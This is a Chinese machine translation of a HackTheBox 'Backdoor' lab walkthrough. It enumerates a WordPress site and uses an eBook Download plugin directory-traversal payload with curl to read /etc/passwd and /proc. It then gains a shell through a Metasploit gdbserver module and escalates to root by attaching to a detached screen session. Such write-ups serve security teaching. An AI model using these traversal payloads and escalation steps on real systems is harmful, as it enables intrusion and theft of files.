<html>
<head>
<title>Backdoor from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子的后门——详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/backdoor-from-hackthebox-detailed-walkthrough-93d238979397?source=collection_archive---------1-----------------------#2022-04-26">https://infosecwriteups.com/backdoor-from-hackthebox-detailed-walkthrough-93d238979397?source=collection_archive---------1-----------------------#2022-04-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="dca5" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">展示完成盒子所需的所有工具和技术。</h2></div><h1 id="762e" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">机器信息</h1><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/45ab92e0c949ff11828e80c1b09d85b7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*gqH6yO38bLlX7M7J.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">黑客盒子的后门</figcaption></figure><p id="586d" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">后门是HackTheBox上的一个简单的机器。我们首先找到一个带有易受攻击插件的基本WordPress站点。这允许目录遍历和本地文件包含，我们用它来泄漏数据和监视进程。由此我们发现了gdbserver的一个易受攻击的版本，我们使用Meterpreter来利用该版本获得一个反向shell。从那里，我们找到一个分离的屏幕会话，我们连接到并获得根。</p><p id="7bb4" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">所需的技能是网络和操作系统枚举。学到的技能是寻找和利用易受攻击的软件。</p><div class="mf mg gp gr mh mi"><a href="https://www.hackthebox.com/home/machines/profile/416" rel="noopener  ugc nofollow" target="_blank"><div class="mj ab fo"><div class="mk ab ml cl cj mm"><h2 class="bd ir gy z fp mn fr fs mo fu fw ip bi translated">后门——黑盒子::渗透测试实验室</h2><div class="mp l"><h3 class="bd b gy z fp mn fr fs mo fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mq l"><p class="bd b dl z fp mn fr fs mo fu fw dk translated">www.hackthebox.com</p></div></div><div class="mr l"><div class="ms l mt mu mv mr mw ld mi"/></div></div></a></div><h1 id="9486" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">初步侦察</h1><p id="4330" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nc"><img src="../Images/7ecc213113a576af06a63979f976e6d2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z5t5rh7vQsEoywNU6AdP-g.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">后门程序的Nmap扫描</figcaption></figure><p id="3118" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">最初找到三个端口。1337看起来很有趣，因为它有点不寻常，但是让我们从端口80上的Apache开始。首先将服务器IP添加到我的主机文件中:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="1d31" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/backdoor]<br/>└─# echo "10.10.11.125 backdoor.htb" &gt;&gt; /etc/hosts</span></pre><h1 id="13ed" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">wordpress软件</h1><p id="e747" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">我们找到一个基本的WordPress站点:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nr"><img src="../Images/4454c0483030271f8d163c564c852d15.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*lKo3bFJvkyvD4Qcv.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">后门网站</figcaption></figure><p id="eebb" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这里没有内容，让我们查找子文件夹:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="1532" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/backdoor]<br/>└─# gobuster dir -u http://backdoor.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt           <br/>===============================================================<br/>Gobuster v3.1.0<br/>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br/>===============================================================<br/>[+] Url:                     http://backdoor.htb<br/>[+] Method:                  GET<br/>[+] Threads:                 10<br/>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br/>[+] Negative Status codes:   404<br/>[+] User Agent:              gobuster/3.1.0<br/>[+] Timeout:                 10s<br/>===============================================================<br/>2021/12/08 22:13:41 Starting gobuster in directory enumeration mode<br/>===============================================================<br/>/wp-content           (Status: 301) [Size: 317] [--&gt; http://backdoor.htb/wp-content/]<br/>/wp-admin             (Status: 301) [Size: 315] [--&gt; http://backdoor.htb/wp-admin/]  <br/>/wp-includes          (Status: 301) [Size: 318] [--&gt; http://backdoor.htb/wp-includes/]<br/>/server-status        (Status: 403) [Size: 277]<br/>===============================================================<br/>2021/12/08 22:15:21 Finished<br/>===============================================================</span></pre><p id="6585" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在这些子文件夹中，有趣的是wp-content，让我们来看看这个:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="65ea" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/backdoor]<br/>└─# gobuster dir -u http://backdoor.htb/wp-content -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br/>===============================================================<br/>Gobuster v3.1.0<br/>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br/>===============================================================<br/>[+] Url:                     http://backdoor.htb/wp-content<br/>[+] Method:                  GET<br/>[+] Threads:                 10<br/>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br/>[+] Negative Status codes:   404<br/>[+] User Agent:              gobuster/3.1.0<br/>[+] Timeout:                 10s<br/>===============================================================<br/>2021/12/08 22:16:12 Starting gobuster in directory enumeration mode<br/>===============================================================<br/>/plugins              (Status: 301) [Size: 325] [--&gt; http://backdoor.htb/wp-content/plugins/]<br/>/themes               (Status: 301) [Size: 324] [--&gt; http://backdoor.htb/wp-content/themes/] <br/>/uploads              (Status: 301) [Size: 325] [--&gt; http://backdoor.htb/wp-content/uploads/]<br/>/upgrade              (Status: 301) [Size: 325] [--&gt; http://backdoor.htb/wp-content/upgrade/]<br/>===============================================================<br/>2021/12/08 22:17:50 Finished<br/>===============================================================</span></pre><p id="8249" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在插件中，我们发现:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/a5591520fb5da37845228edb3740b284.png" data-original-src="https://miro.medium.com/v2/resize:fit:1344/format:webp/0*bybbs-9kg1WLmTCF.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">电子书-下载插件文件夹</figcaption></figure><h1 id="d5d8" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Searchsploit</h1><p id="25db" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">Searchsploit给了我们一些有用的东西:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nt"><img src="../Images/9a65a73813d9264972d48c94872128b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*slNTqzHylUhHZB54hGsIJA.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">搜索漏洞检查</figcaption></figure><p id="4eb0" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">让我们来看看:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="7e77" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/backdoor]<br/>└─# searchsploit -m php/webapps/39575.txt<br/>  Exploit: WordPress Plugin eBook Download 1.1 - Directory Traversal<br/>      URL: https://www.exploit-db.com/exploits/39575<br/>     Path: /usr/share/exploitdb/exploits/php/webapps/39575.txt<br/>File Type: ASCII text<br/><br/>Copied to: /root/39575.txt<br/><br/>┌──(root💀kali)-[~/htb/backdoor]<br/>└─# cat 39575.txt <br/># Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal<br/># Exploit Author: Wadeek<br/># Website Author: https://github.com/Wad-Deek<br/># Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip<br/># Version: 1.1<br/># Tested on: Xampp on Windows7<br/><br/>[Version Disclosure]<br/>======================================<br/>http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt<br/>======================================<br/><br/>[PoC]<br/>======================================<br/>/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php<br/>======================================</span></pre><h1 id="d6a1" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">利用插件</h1><p id="378f" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">所以我们有简单的目录遍历和本地文件包含(LFI)漏洞。让我们试试上面给出的例子:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nu"><img src="../Images/07319af1a4c6ce4bc889a831208941fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Q3LgoHDYDYlluv-wadcktA.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">使用curl读取远程文件</figcaption></figure><p id="3427" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这很有效，我们来看看passwd:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="1a1e" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/backdoor]<br/>└─# curl <a class="ae nv" href="http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd" rel="noopener ugc nofollow" target="_blank">http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd</a></span><span id="9a17" class="nm kg iq ni b gy nw no l np nq">root:x:0:0:root:/root:/bin/bash<br/>&lt;SNIP&gt;<br/>user:x:1000:1000:user:/home/user:/bin/bash</span></pre><h1 id="c394" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">监视进程</h1><p id="f87c" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">这也是可行的，我们只将root和user视为我们可能感兴趣的帐户。</p><p id="5050" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在之前的nmap扫描中，我们看到端口1337是开放的。有了读取任意文件的能力，我们可以检查/proc并查看机器上正在运行什么进程。这个解释了更多关于/proc伪文件系统如何工作的内容。</p><p id="fb7b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我使用了一个简单的循环来递增地检查/处理:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nx"><img src="../Images/6e4a4ad2e6d4d24e66f99539231a4de9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ldyspQFG7QKArfHsTdF3aQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">使用curl监视进程</figcaption></figure><p id="5c50" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我们发现两件有趣的事情。1337端口运行的是gdbserver，这是我们立足之路。我们还可以看到screen正在运行一个分离的会话，我们稍后将回到这一点。</p><h1 id="2a68" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">水表读数器</h1><p id="4236" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">快速搜索gdb漏洞发现了<a class="ae nv" href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/gdb/gdb_server_exec" rel="noopener ugc nofollow" target="_blank">这篇</a>关于Metasploit方法的文章。让我们试试:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ny"><img src="../Images/ce3b3ec18546215c1d75b98af64e5298.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pzZbrXnmbkg7z1hFE7oldw.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">使用仪表指示器开发箱子</figcaption></figure><p id="02cc" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我们已经连接了一个会话，现在启动一个shell:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="e44d" class="nm kg iq ni b gy nn no l np nq">meterpreter &gt; shell<br/>Process 2402 created.<br/>Channel 1 created.<br/>python3 -c "import pty;pty.spawn('/bin/bash')"<br/>user@Backdoor:~$</span></pre><h1 id="b825" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">用户标志</h1><p id="c926" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">外壳稳定后，让我们抓住用户标志:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="36cc" class="nm kg iq ni b gy nn no l np nq">user@Backdoor:~$ id<br/>id<br/>uid=1000(user) gid=1000(user) groups=1000(user)<br/><br/>user@Backdoor:~$ ls -l<br/>-rw-r----- 1 root user 33 Dec  9 23:17 user.txt<br/><br/>user@Backdoor:~$ cat user.txt<br/>&lt;HIDDEN&gt;</span></pre><h1 id="e87e" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">权限提升</h1><p id="37f2" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">通往根的道路很简单，但前提是你要早点注意。当我们远程扫描机器上运行的进程时，我们看到了以下内容:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="66a1" class="nm kg iq ni b gy nn no l np nq">/proc/814/cmdline/proc/814/cmdline/proc/814/cmdline/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done</span></pre><p id="001c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这表明screen正在运行一个名为root的分离会话。所以可以很有把握地假设，我们只需要连接到那个屏幕就可以得到我们的根shell。</p><p id="a9d7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><a class="ae nv" href="https://linux.die.net/man/1/screen" rel="noopener ugc nofollow" target="_blank">这个</a>解释了什么是屏幕及其使用的参数，这些是我们可以看到正在使用的参数:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="826b" class="nm kg iq ni b gy nn no l np nq">-d -m Start screen in "detached" mode. This creates a new session but doesn't attach to it. This is useful for system startup scripts.<br/>-S sessionname</span></pre><p id="fbab" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这很好也很简单:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="6b7a" class="nm kg iq ni b gy nn no l np nq">user@Backdoor:~$ /usr/bin/screen -x root/root<br/>/usr/bin/screen -x root/root<br/>Please set a terminal type.</span></pre><p id="4930" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">请设置终端，然后再试一次:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="cac8" class="nm kg iq ni b gy nn no l np nq">user@Backdoor:~$ export TERM=xterm<br/>export TERM=xterm<br/>user@Backdoor:~$ /usr/bin/screen -x root/root<br/>/usr/bin/screen -x root/root<br/>root@Backdoor:~#</span></pre><h1 id="14c1" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">根标志</h1><p id="b13f" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">好了，让我们抓住根旗:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="0921" class="nm kg iq ni b gy nn no l np nq">root@Backdoor:~# id<br/>uid=0(root) gid=0(root) groups=0(root)<br/><br/>root@Backdoor:~# ls -l<br/>-rw-r--r-- 1 root root 33 Dec  9 23:17 root.txt<br/><br/>root@Backdoor:~# cat root.txt<br/>&lt;HIDDEN&gt;</span></pre><p id="62f0" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">完成了。下次见。</p></div><div class="ab cl nz oa hu ob" role="separator"><span class="oc bw bk od oe of"/><span class="oc bw bk od oe of"/><span class="oc bw bk od oe"/></div><div class="ij ik il im in"><p id="3729" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">推特—<a class="ae nv" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae nv" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="0f0e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="og">原载于2022年4月26日</em><a class="ae nv" href="https://pencer.io/ctf/ctf-htb-backdoor" rel="noopener ugc nofollow" target="_blank"><em class="og">https://pencer . io</em></a><em class="og">。</em></p></div></div>    
</body>
</html>